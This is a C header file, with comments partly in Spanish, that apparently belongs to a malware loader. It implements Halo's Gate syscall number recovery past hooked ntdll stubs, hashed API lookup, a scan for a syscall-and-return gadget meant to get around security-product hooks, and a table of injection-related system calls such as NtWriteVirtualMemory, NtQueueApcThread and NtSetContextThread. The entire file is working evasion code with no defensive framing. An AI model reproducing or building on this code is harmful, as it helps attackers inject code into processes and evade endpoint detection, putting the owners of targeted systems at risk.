#ifndef SYS_CALLS_H
#define SYS_CALLS_H

#include <windows.h>
#include <winternl.h>
#include "api_hashes.h"
#include "crypto.h" // Para derivar claves en tiempo de ejecución

// Aumentar distancia máxima de búsqueda para compatibilidad con nuevas builds de Windows
#define MAX_SEARCH_DISTANCE 50

// =============================================================================
// SYSCALL ENTRY & TABLE STRUCTURES
// =============================================================================

typedef struct _SYSCALL_ENTRY {
    WORD   ssn;
    PVOID  address;
    PVOID  cleanAddress;
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

typedef struct _SYSCALL_TABLE {
    SYSCALL_ENTRY NtAllocateVirtualMemory;
    SYSCALL_ENTRY NtProtectVirtualMemory;
    SYSCALL_ENTRY NtWriteVirtualMemory;
    SYSCALL_ENTRY NtQueueApcThread;
    SYSCALL_ENTRY NtGetContextThread;
    SYSCALL_ENTRY NtSetContextThread;
    SYSCALL_ENTRY NtWaitForSingleObject;
    SYSCALL_ENTRY NtOpenFile;
    SYSCALL_ENTRY NtQueryInformationFile;
    SYSCALL_ENTRY NtCreateSection;
    SYSCALL_ENTRY NtMapViewOfSection;
    SYSCALL_ENTRY NtClose;
    SYSCALL_ENTRY NtQueryVirtualMemory;
    SYSCALL_ENTRY NtOpenKey;
    SYSCALL_ENTRY NtDelayExecution;
    SYSCALL_ENTRY NtCreateTimer2;
} SYSCALL_TABLE;

typedef struct _API_TABLE {
    SYSCALL_TABLE syscalls;
    ULONG_PTR     CreateWaitableTimerW;
    ULONG_PTR     SetWaitableTimer;
    ULONG_PTR     SystemFunction032;
    PVOID         CleanNtdllBase;
} API_TABLE;

// =============================================================================
// HALO'S GATE V2 – FULL 11-BYTE STUB VALIDATION
// =============================================================================
// Standard ntdll syscall stub (11 bytes):
//   4C 8B D1       mov r10, rcx
//   B8 XX XX 00 00 mov eax, SSN
//   0F 05          syscall
//   C3             ret
// Total verified: bytes 0-6 (7 bytes prefix) + syscall;ret at known offset
// =============================================================================

static __forceinline BOOL ValidateStubFull(PBYTE p) {
    // Check: mov r10, rcx (4C 8B D1)
    if (p[0] != 0x4C || p[1] != 0x8B || p[2] != 0xD1) return FALSE;
    // Check: mov eax, imm32 (B8 xx xx 00 00) – SSN is always < 0x10000
    if (p[3] != 0xB8) return FALSE;
    if (p[5] != 0x00 || p[6] != 0x00) return FALSE;
    return TRUE;
}

// Count real clean stubs to determine the actual stride between functions
static __forceinline int CountStubsInRange(PBYTE base, int rangeBytes) {
    int count = 0;
    for (int offset = 0; offset < rangeBytes - 11; offset++) {
        if (ValidateStubFull(base + offset)) count++;
    }
    return count;
}

static WORD GetSSN(PVOID pFunc) {
    if (!pFunc) return 0;
    PBYTE p = (PBYTE)pFunc;

    // Case 1: Clean stub – direct read
    if (ValidateStubFull(p)) {
        return *(WORD *)(p + 4);
    }

    // Case 2: Hooked – Halo's Gate v2
    // Scan neighbour stubs (up to MAX_SEARCH_DISTANCE stubs)
    for (int distance = 1; distance <= MAX_SEARCH_DISTANCE; distance++) {
        // Search upward
        for (int stride = 32; stride >= 28; stride--) {
            PBYTE pUp = p - (distance * stride);
            if (ValidateStubFull(pUp)) {
                WORD neighborSSN = *(WORD *)(pUp + 4);
                return neighborSSN + (WORD)distance;
            }
        }
        // Search downward
        for (int stride = 32; stride >= 28; stride--) {
            PBYTE pDown = p + (distance * stride);
            if (ValidateStubFull(pDown)) {
                WORD neighborSSN = *(WORD *)(pDown + 4);
                return neighborSSN - (WORD)distance;
            }
        }
    }

    return 0; // Failed to resolve
}

// =============================================================================
// GADGET FRESHNESS VERIFICATION
// =============================================================================
// Verify the syscall;ret gadget hasn't been tampered with

static __forceinline BOOL VerifyGadgetFreshness(PVOID gadget) {
    if (!gadget) return FALSE;
    PBYTE g = (PBYTE)gadget;
    // Must be: 0F 05 C3 (syscall; ret)
    return (g[0] == 0x0F && g[1] == 0x05 && g[2] == 0xC3);
}

// =============================================================================
// FIND SYSCALL;RET GADGET IN NTDLL
// =============================================================================

static PVOID FindSyscallGadgetViaHash() {
    PVOID hNtdll = GetModuleBaseByHash(HASH_NTDLL);
    if (!hNtdll) return NULL;

    // Resolve a known clean function as an anchor
    PVOID pFunc = ResolveApiByHash(hNtdll, HASH_NtProtectVirtualMemory);
    if (!pFunc) pFunc = ResolveApiByHash(hNtdll, HASH_NtAllocateVirtualMemory);
    if (!pFunc) return NULL;

    // Robust search: Scan from anchor + 4KB to bypass localized hooks
    PBYTE scanStart = (PBYTE)pFunc + 0x1000;
    PBYTE scanEnd = scanStart + 0x1000;
    
    for (PBYTE p = scanStart; p < scanEnd; p++) {
        if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3) { // syscall; ret
            // Verificar bytes previos para robustez (ret; xor rax, rax; ret)
            if (*(DWORD*)(((PBYTE)p) - 4) == 0xC3C03348) { 
                 return p - 4; // Returning p-4 as per requested robust logic
            }
            return p;
        }
    }

    // Fallback: scan near anchor
    PBYTE pByte = (PBYTE)pFunc;
    for (int i = 0; i < 64; i++) {
        if (pByte[i] == 0x0F && pByte[i + 1] == 0x05 && pByte[i + 2] == 0xC3) {
            PVOID gadget = (PVOID)(pByte + i);
            if (VerifyGadgetFreshness(gadget)) return gadget;
        }
    }

    // Fallback: scan ntdll .text section for any ret gadget
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (WORD s = 0; s < pNt->FileHeader.NumberOfSections; s++) {
        if (pSec[s].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            PBYTE secBase = (PBYTE)hNtdll + pSec[s].VirtualAddress;
            DWORD secSize = pSec[s].Misc.VirtualSize;
            for (DWORD j = 0; j < secSize - 3; j++) {
                if (secBase[j] == 0x0F && secBase[j + 1] == 0x05 && secBase[j + 2] == 0xC3) {
                    return (PVOID)(secBase + j);
                }
            }
        }
    }

    return NULL;
}

// =============================================================================
// INITIALIZE FULL SYSCALL TABLE
// =============================================================================

static void InitializeSyscallTable(SYSCALL_TABLE *tbl, PVOID hNtdll, PVOID gadget) {
    #define RESOLVE_SYSCALL(field, hashName) do { \
        tbl->field.address = ResolveApiByHash(hNtdll, hashName); \
        tbl->field.ssn = GetSSN(tbl->field.address); \
        tbl->field.cleanAddress = gadget; \
    } while (0)

    RESOLVE_SYSCALL(NtAllocateVirtualMemory, HASH_NtAllocateVirtualMemory);
    RESOLVE_SYSCALL(NtProtectVirtualMemory,  HASH_NtProtectVirtualMemory);
    RESOLVE_SYSCALL(NtWriteVirtualMemory,    HASH_NtWriteVirtualMemory);
    RESOLVE_SYSCALL(NtQueueApcThread,        HASH_NtQueueApcThread);
    RESOLVE_SYSCALL(NtGetContextThread,      HASH_NtGetContextThread);
    RESOLVE_SYSCALL(NtSetContextThread,      HASH_NtSetContextThread);
    RESOLVE_SYSCALL(NtWaitForSingleObject,   HASH_NtWaitForSingleObject);
    RESOLVE_SYSCALL(NtOpenFile,              HASH_NtOpenFile);
    RESOLVE_SYSCALL(NtQueryInformationFile,  HASH_NtQueryInformationFile);
    RESOLVE_SYSCALL(NtCreateSection,         HASH_NtCreateSection);
    RESOLVE_SYSCALL(NtMapViewOfSection,      HASH_NtMapViewOfSection);
    RESOLVE_SYSCALL(NtClose,                 HASH_NtClose);
    RESOLVE_SYSCALL(NtQueryVirtualMemory,    HASH_NtQueryVirtualMemory);
    RESOLVE_SYSCALL(NtOpenKey,               HASH_NtOpenKey);
    RESOLVE_SYSCALL(NtDelayExecution,        HASH_NtDelayExecution);
    RESOLVE_SYSCALL(NtCreateTimer2,          HASH_NtCreateTimer2);

    #undef RESOLVE_SYSCALL
}

// =============================================================================
// ASM EXTERN
// =============================================================================

extern "C" NTSTATUS InvokeSyscall(WORD ssn, PVOID gadget, ...);

#endif
